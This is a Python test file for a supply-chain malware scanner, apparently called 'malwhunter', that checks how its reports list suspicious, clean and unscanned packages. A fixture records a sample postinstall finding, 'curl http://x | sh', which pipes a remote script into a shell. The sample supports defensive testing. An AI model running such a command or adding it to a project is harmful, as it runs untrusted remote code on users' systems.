import json

from malwhunter.dossier.model import Dossier, Evidence, Severity, Signal, SignalSource
from malwhunter.report.json_report import dossiers_to_json_str
from malwhunter.report.markdown import dossiers_to_markdown
from malwhunter.report.terminal import dossiers_to_terminal


def _bad_dossier() -> Dossier:
    d = Dossier(package="left-pad-utilz", version="1.0.0")
    d.add_signal(
        Signal(
            id="s1",
            source=SignalSource.RECON,
            category="lifecycle-script-abuse",
            severity=Severity.HIGH,
            description="postinstall pipes a remote script into sh",
            evidence=[Evidence(excerpt="curl http://x | sh", file="package.json")],
        )
    )
    return d


def _clean_dossier() -> Dossier:
    return Dossier(package="sum-two-numbers", version="1.0.0")


def test_json_report_round_trips():
    out = dossiers_to_json_str([_bad_dossier(), _clean_dossier()])
    data = json.loads(out)
    assert data["package_count"] == 2
    verdicts = {d["package"]: d["verdict"] for d in data["dossiers"]}
    assert verdicts["left-pad-utilz"] == "suspicious"
    assert verdicts["sum-two-numbers"] == "clean"


def test_markdown_report_lists_notable_and_clean_packages_separately():
    out = dossiers_to_markdown([_bad_dossier(), _clean_dossier()], "my-project")
    findings_section = out.split("## Clean")[0]
    assert "left-pad-utilz" in findings_section
    assert "sum-two-numbers" not in findings_section
    assert "## Clean" in out
    assert "sum-two-numbers" in out.split("## Clean")[1]


def test_terminal_report_has_summary_and_badge():
    out = dossiers_to_terminal([_bad_dossier(), _clean_dossier()], "my-project")
    assert "1 clean" in out
    assert "1 suspicious" in out
    assert "SUSPICIOUS" in out
    assert "left-pad-utilz" in out


def test_terminal_report_lists_clean_packages_in_their_own_section_last():
    out = dossiers_to_terminal([_bad_dossier(), _clean_dossier()], "my-project")
    findings_section = out.split("CLEAN")[0]
    assert "left-pad-utilz" in findings_section
    assert "sum-two-numbers" not in findings_section
    assert "sum-two-numbers" in out.split("CLEAN")[-1]


def test_unscanned_package_is_never_reported_as_clean():
    from malwhunter.dossier.model import Dossier
    from malwhunter.report.markdown import dossiers_to_markdown
    from malwhunter.report.terminal import dossiers_to_terminal

    dossiers = [
        Dossier(package="fine", version="1.0.0"),
        Dossier(package="flaky", version="2.0.0", scan_error="could not fetch/extract: registry returned 503"),
    ]
    term = dossiers_to_terminal(dossiers, ".")
    assert "ALL PACKAGES CLEAN" not in term
    assert "SCAN INCOMPLETE" in term
    assert "1 unscanned" in term
    assert "not scanned: could not fetch/extract" in term

    md = dossiers_to_markdown(dossiers, ".")
    assert "No suspicious or malicious packages found." not in md
    assert "## flaky@2.0.0 — `UNSCANNED`" in md
    assert "**Not scanned:** could not fetch/extract" in md
